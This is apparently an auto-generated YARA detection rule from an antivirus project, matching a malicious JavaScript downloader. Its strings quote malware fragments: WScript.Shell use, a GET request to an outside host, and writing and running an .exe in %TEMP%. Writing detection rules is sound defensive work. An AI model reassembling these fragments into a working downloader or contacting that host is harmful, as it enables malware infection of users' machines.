rule sig_20160328_8f65eac03422ade11be21a833627ff0c {
  meta:
    description = "datamaliciousorder - file 20160328_8f65eac03422ade11be21a833627ff0c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "06290394e13d1d3de4e6ad5f6932ed65ca5515689f6f925808a85fba4f75ef7a"

  strings:
    $s1  = "function Uavxha() {return Veelddaerc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"htlkWq1Dn8.exe\";};" fullword ascii
    $s2  = "Loaafocwhk[Klpyjozgvy](\"GET\", \"http://happyweek.us/kei3a\", false);" fullword ascii
    $s3  = "var Veelddaerc = function Ebffeh() {return WScript[Luklu](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Kbqesz(Zrlwwdewld, Fukkm){return Zrlwwdewld - Fukkm;};" fullword ascii
    $s5  = "function Fhpadzn(Opiawggr){Veelddaerc[\"Run\"](Opiawggr, Xjtmpbhf, Xjtmpbhf);};" fullword ascii
    $s6  = "do {WScript[Ofzkvxicae](Kgizikeazi() * 11)} while (Loaafocwhk[\"readystate\"] < 4 );" fullword ascii
    $s7  = "function Rrihd() {return ((Zeysfazq == true) && (Zeysfazq == Ifsiv)) ? 1 : Xjtmpbhf;};" fullword ascii
    $s8  = "function Zmbtkkz(){return Alggkyrmt;};" fullword ascii
    $s9  = "function Jxqhspfi()" fullword ascii
    $s10 = "function Kgizikeazi(){return 22;};" fullword ascii
    $s11 = "var Ifsiv = false;" fullword ascii
    $s12 = "var Hexnevfcj = false;" fullword ascii
    $s13 = " while (Asotmyua){" fullword ascii
    $s14 = "function Ixdctu(){return Luklu;};" fullword ascii
    $s15 = "Zeysfazq = true; " fullword ascii
    $s16 = "return Kbqesz(Dsmxkftlbp, Rmvgjzoy);" fullword ascii
    $s17 = "Ifsiv = true; " fullword ascii
    $s18 = "var Ccewgz = new this[\"Date\"]();" fullword ascii
    $s19 = "var Zeysfazq = false;" fullword ascii
    $s20 = "function Pxabkyxvg(Spcowzukl) {var Dpdiv = (1, 2, 3, 4, 5, Spcowzukl); return Dpdiv;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}